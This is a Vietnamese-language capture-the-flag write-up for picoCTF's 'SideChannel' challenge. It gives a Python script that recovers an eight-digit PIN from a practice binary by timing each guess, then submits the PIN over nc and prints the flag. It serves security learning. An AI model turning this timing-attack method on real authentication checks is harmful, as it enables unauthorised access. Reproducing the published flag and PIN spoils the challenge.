# Write up: SideChannel

<img width="832" height="765" alt="image" src="https://github.com/user-attachments/assets/64a91495-f01c-4c13-94da-84e8cf69d707" />

---

Đề bài cho file chương trình kiểm tra mã pin và trang web nhập mã pin để lấy flag. 
Hint bài gợi ý lên quan đến kĩ thuật **timing-based side-channel attacks**. Khai thác sự chênh lệch thời gian thực thi của chương trình pin_checker khi nhập các giá trị PIN khác nhau để suy ra PIN đúng từng chữ số một.

## Ý tưởng

- Viết script python tự động thử tất cả các trường hợp đến khi tìm ra.

```
Pseudocode của hàm check_pin():
    for i in range(8):
        if input[i] != correct_pin[i]:
            sleep(một khoảng thời gian ngắn)
            return ACCESS_DENIED   ← thoát ngay khi sai
        # nếu đúng → tiếp tục vòng lặp
    return ACCESS_GRANTED
```

```python
import subprocess
import os
import time

flag = False
while not flag:
    string = "00000000"
    for i in range(8):
        max_time = 0
        max_num = 0
        for j in range(10):
            inp = string[:i] + str(j) + string[i+1:]
            p = subprocess.Popen(
                './pin_checker',
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE
            )
            start = time.time()
            output, error = p.communicate(
                bytes(os.linesep.join([inp]), 'ascii')
            )
            end = time.time()

            if end - start > max_time:
                max_time = end - start
                max_num = j

            if b"Access denied" not in output:
                print(f"[+] PIN found: {inp}")
                flag = True
                break

        string = string[:i] + str(max_num) + string[i+1:]
        print(f"[*] Position {i}: digit = {max_num} | time = {max_time:.4f}s")

print(f"[+] Final PIN: {string}")
```

## **Kết quả**

```
└─$ python3 a.py                                                        
[*] Position 0: digit = 0 | time = 0.2748s
[*] Position 1: digit = 9 | time = 0.1261s
[*] Position 2: digit = 7 | time = 0.1263s
[*] Position 3: digit = 8 | time = 0.1299s
[*] Position 4: digit = 3 | time = 0.1283s
[*] Position 5: digit = 5 | time = 0.1312s
[*] Position 6: digit = 7 | time = 0.1331s
[*] Position 7: digit = 5 | time = 0.1305s
[*] Position 0: digit = 4 | time = 0.2599s
[*] Position 1: digit = 8 | time = 0.3887s
[*] Position 2: digit = 3 | time = 0.5234s
[*] Position 3: digit = 9 | time = 0.7727s
[*] Position 4: digit = 0 | time = 0.7646s
[*] Position 5: digit = 5 | time = 0.8845s
[*] Position 6: digit = 1 | time = 1.0081s
[+] PIN found: 48390513
[*] Position 7: digit = 3 | time = 1.1133s
[+] Final PIN: 48390513
```
---
Sau khi tìm được mã **pin**, sử dụng **nc** để kết nối vào server đề bài để nhập.

```
└─$ nc saturn.picoctf.net 57280
Verifying that you are a human...
Please enter the master PIN code:
48390513
Password correct. Here's your flag:
picoCTF{t1m1ng_4tt4ck_914c5ec3}
```

## Flag: picoCTF{t1m1ng_4tt4ck_914c5ec3}
